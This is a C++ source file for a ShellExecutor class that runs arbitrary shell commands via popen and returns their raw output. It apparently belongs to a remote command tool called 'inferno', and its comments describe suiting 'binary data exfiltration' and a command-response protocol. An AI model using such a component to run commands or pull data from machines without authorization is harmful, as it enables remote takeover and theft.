#include "../include/ShellExecutor.hpp"
#include <array>
#include <cstdio>
#include <stdexcept>

namespace inferno {

ShellExecutor::Result ShellExecutor::execute(const std::string& command) const {
    Result result;
    result.success = false;

    // Redirect stderr to stdout so we capture all output in one stream
    const std::string full_cmd = command + " 2>&1";

    // popen() creates a pipe, forks a shell process, and returns a FILE* handle.
    // NOTE: popen() internally calls fork() inside libc — this is not our code
    // calling fork() and is acceptable within the project constraints.
    // TODO(Circle 7 - Violence): Replace with non-blocking pipe + select() integration
    //   to prevent the event loop from blocking on long-running commands.
    FILE* pipe = ::popen(full_cmd.c_str(), "r");
    if (!pipe) {
        result.output = "[ShellExecutor] Error: popen() failed to launch command.";
        return result;
    }

    // Read output in CHUNK_SIZE-byte increments using fread() — not fgets().
    // fgets() is line-oriented and NUL-terminated: it silently truncates output at
    // any embedded NUL byte, making it unsuitable for binary data exfiltration.
    // fread() reads raw bytes and correctly reports the exact number read.
    std::array<char, CHUNK_SIZE> buffer;
    while (true) {
        const size_t n = ::fread(buffer.data(), 1, buffer.size(), pipe);
        if (n == 0) break;
        result.output.append(buffer.data(), n);
    }

    // pclose() waits for the child process and returns its exit status.
    const int exit_code = ::pclose(pipe);
    result.success = (exit_code == 0);

    // NOTE: empty output is valid and intentional (e.g. touch, mkdir, chmod).
    // The protocol's CMD_RES status=1 byte already signals end-of-output.
    // Do NOT replace empty output with a synthetic string — it corrupts semantics.

    return result;
}

} // namespace inferno
